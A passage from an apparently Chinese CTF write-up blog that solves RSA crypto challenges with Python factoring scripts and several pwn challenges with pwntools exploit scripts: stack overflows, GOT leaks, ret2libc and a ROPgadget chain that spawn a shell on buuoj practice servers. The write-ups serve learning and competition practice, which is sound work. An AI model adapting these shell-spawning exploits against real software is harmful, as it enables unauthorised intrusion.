class="hljs-number">38349170988872029319819687046591193416244322947593619195539375510534996074403332340181891419</span></span><br>7024630229938574254827858989603328289498120035327063712721348317218252989049590342564911675590163110<br>1665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190<br>2855211377856880756228329248292483627744764562328268858010469693845195493854282595915667168908446046<br>9625878363939085415303932948072620514719924718362153517245082597904713249543960384080650125499716705<br>1142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352<br>034177484688502364022887<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d=gmpy2.invert(<span class="hljs-number">65537</span>,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m=<span class="hljs-built_in">pow</span>(c,d,n8)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125;<br></code></pre></td></tr></table></figure>
<h2 id="roarctf-rsa"><a href="#roarctf-rsa" class="headerlink" title="roarctf rsa"></a>roarctf rsa</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">A</span>=(((y%x)**<span class="hljs-number">5</span>)%(x%y))**<span class="hljs-number">2019</span>+y**<span class="hljs-number">316</span>+(y+<span class="hljs-number">1</span>)/x<br><span class="hljs-attr">p</span>=next_prime(z*x*y)<br><span class="hljs-attr">q</span>=next_prime(z)<br><span class="hljs-attr">A</span> =  <span class="hljs-number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span><br><span class="hljs-attr">n</span> =  <span class="hljs-number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span><br><span class="hljs-attr">c</span> =  <span class="hljs-number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span><br></code></pre></td></tr></table></figure>
<p>题目很短主要还是通过A求得pq<br>通过开根号即可</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">y</span>=<span class="hljs-number">83</span><br><span class="hljs-attr">x</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>下面就是约束爆破qp了</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">temp = gmpy2.iroot(n/<span class="hljs-number">166</span>,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65537</span>):</span><br><span class="hljs-meta">...</span> <span class="python">    a = gmpy2.next_prime(temp-i)</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">if</span> n%a==<span class="hljs-number">0</span>:</span><br><span class="hljs-meta">...</span> <span class="python">        q = a</span><br><span class="hljs-meta">...</span> <span class="python">        p = n//q</span><br><span class="hljs-meta">...</span> <span class="python">        <span class="hljs-keyword">break</span></span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>&#x27;RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125;&#x27;<br></code></pre></td></tr></table></figure>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sympy<br>import random<br><br>def myGetPrime():<br>    A= getPrime(513)<br>    <span class="hljs-builtin-name">print</span>(A)<br>    <span class="hljs-attribute">B</span>=A-random.randint(1e3,1e5)<br>    <span class="hljs-builtin-name">print</span>(B)<br>    return sympy.nextPrime((B!)%A)<br><span class="hljs-attribute">p</span>=myGetPrime()<br><span class="hljs-comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="hljs-comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><br><span class="hljs-attribute">q</span>=myGetPrime()<br><span class="hljs-comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="hljs-comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><br><span class="hljs-attribute">r</span>=myGetPrime()<br><br><span class="hljs-attribute">n</span>=p*q*r<br><span class="hljs-comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><span class="hljs-attribute">c</span>=pow(flag,e,n)<br><span class="hljs-comment">#e=0x1001</span><br><span class="hljs-comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="hljs-comment">#so,what is the flag?</span><br></code></pre></td></tr></table></figure>
<p>Wilson’s theorem<br>当且仅当p为素数时：( p -1 )! ≡ -1 ( mod p )<br>可以观察发现A与B的差很小<br>通过构造求得pqr</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myGetPrime</span>(<span class="hljs-params">a,b</span>):</span></span><br><span class="hljs-meta">...</span> <span class="python">    ans=<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b+<span class="hljs-number">1</span>,a):</span><br><span class="hljs-meta">...</span> <span class="python">        ans=(i*ans)%a</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">...</span> <span class="python">    ans *= -<span class="hljs-number">1</span></span><br><span class="hljs-meta">...</span> <span class="python">    s = gmpy2.invert(ans,a)</span><br><span class="hljs-meta">...</span> <span class="python">    <span class="hljs-keyword">return</span> gmpy2.next_prime(s)</span><br><span class="hljs-meta">...</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">p = myGetPrime(A1,B1)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">q = myGetPrime(A2,B2)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">r = n//p//q</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">d = gmpy2.invert(e,phi)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">m = <span class="hljs-built_in">pow</span>(c,d,n)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)</span><br>&#x27;RoarCTF&#123;wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A&#125;&#x27;<br></code></pre></td></tr></table></figure>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><img src="37.png" srcset="/img/loading.gif" lazyload alt="37"><br>gets函数很明显的栈溢出<br>这边有个加密部分。。。其实可以构造\0直接绕过strlen<br>这样就不需要加密了<br>泄露puts的got表地址后搜索libc即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-attribute">debug</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">a</span> = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">a</span> = remote(&#x27;node<span class="hljs-number">3</span>.buuoj.cn&#x27;,<span class="hljs-number">29305</span>)<br><br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;rop&quot;</span>)<br><span class="hljs-attribute">p_r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">83</span><br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br><span class="hljs-attribute">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-attribute">temp</span> = &#x27;a&#x27;*<span class="hljs-number">87</span> + &#x27;\<span class="hljs-number">0</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(elf.got[&#x27;puts&#x27;]) + p<span class="hljs-number">64</span>(elf.plt[&#x27;puts&#x27;])<br><span class="hljs-attribute">temp</span> += p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400</span>B<span class="hljs-number">28</span>)<br><span class="hljs-attribute">pay</span> = &#x27;&#x27;<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;encrypted&quot;</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(temp)<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">print</span> a.recvline()<br><span class="hljs-attribute">puts</span> = u<span class="hljs-number">64</span>(a.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,&#x27;\<span class="hljs-number">0</span>&#x27;))<br><span class="hljs-attribute">print</span> hex(puts)<br><span class="hljs-attribute">libc</span> = LibcSearcher(&#x27;puts&#x27;, puts)<br><span class="hljs-attribute">libc_base</span> = puts - libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">sys</span> = libc_base+libc.dump(&#x27;execve&#x27;)<br><span class="hljs-attribute">bash</span> = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;choice!&quot;</span>)<br><span class="hljs-attribute">a</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-attribute">p_2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">81</span><br><span class="hljs-attribute">temp</span> = &#x27;&#x27;<br><span class="hljs-attribute">temp</span> += &#x27;a&#x27;*<span class="hljs-number">87</span> + &#x27;\<span class="hljs-number">0</span>&#x27; + p<span class="hljs-number">64</span>(p_r) + p<span class="hljs-number">64</span>(bash) + p<span class="hljs-number">64</span>(p_<span class="hljs-number">2</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(sys)<br><span class="hljs-attribute">a</span>.recvuntil(<span class="hljs-string">&quot;encrypted&quot;</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-attribute">a</span>.sendline(temp)<br><span class="hljs-attribute">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="38.png" srcset="/img/loading.gif" lazyload alt="38"></p>
<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>gets溢出后修改对应的浮点数即可</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-built_in">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./ciscn_2019_n_1&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25753</span>)<br><br><span class="hljs-comment">#a.recvuntil(&quot;number.&quot;)</span><br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">44</span> + p64(<span class="hljs-number">0x41348000</span>)<br><span class="hljs-keyword">a</span>.sendline(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="ogeek-babyrop"><a href="#ogeek-babyrop" class="headerlink" title="ogeek babyrop"></a>ogeek babyrop</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-built_in">from</span> LibcSearcher import *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">a</span> = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27215</span>)<br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>pay = <span class="hljs-string">&#x27;\0&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">10</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x8048825</span>) + p32(<span class="hljs-number">1</span>) + p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-built_in">write</span> = u32(<span class="hljs-keyword">a</span>.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>print hex(<span class="hljs-built_in">write</span>)<br>sys = <span class="hljs-built_in">write</span> - libc.symbols[<span class="hljs-string">&quot;write&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>bash = <span class="hljs-built_in">write</span> - libc.symbols[<span class="hljs-string">&quot;write&quot;</span>] + libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><br>pay = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">&#x27;\xff&#x27;</span>*<span class="hljs-number">10</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(sys) + p32(sys) + p32(bash) + p32(bash)<br><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(pay)<br><span class="hljs-comment">#gdb.attach(a)</span><br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>打法很多<br>ropchain是第一想法<br>后来看到了后门也可以利用</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># execve generated by ROPgadget</span><br>from pwn import *<br>from struct import <span class="hljs-keyword">pack</span><br><br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">&#x27;&#x27;</span><br><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b91e6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b91e6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049463</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080557ab</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481ad</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># @ .data</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc31</span>) <span class="hljs-comment"># pop ecx ; pop ebx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb060</span>) <span class="hljs-comment"># padding without overwrite ebx</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806fc0a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080eb068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049463</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807b1ef</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += <span class="hljs-keyword">pack</span>(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806d7e5</span>) <span class="hljs-comment"># int 0x80</span><br>a = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure>
